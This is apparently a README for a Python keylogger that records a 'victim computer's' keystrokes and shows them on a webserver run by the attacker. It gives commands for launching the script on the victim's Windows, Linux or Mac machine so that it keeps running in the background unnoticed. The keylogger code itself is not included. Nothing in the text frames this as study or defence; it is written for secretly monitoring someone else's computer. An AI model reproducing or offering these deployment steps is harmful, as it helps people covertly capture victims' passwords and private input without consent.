# Keylogger
A simple keylogger written in python script which would capture the keystrokes of a victim computer and display it on a webserver hosted by the attacker.

# Keylogger.py

This is the code which should run on the victim's computer.

If Victim's pc is a windows, open cmd and type:
```
pythonw Keylogger.py
```
if it's linux or Mac, type:
```
nohup python keylogger.py & disown
```
Then you can close the window and it'll run on the background 
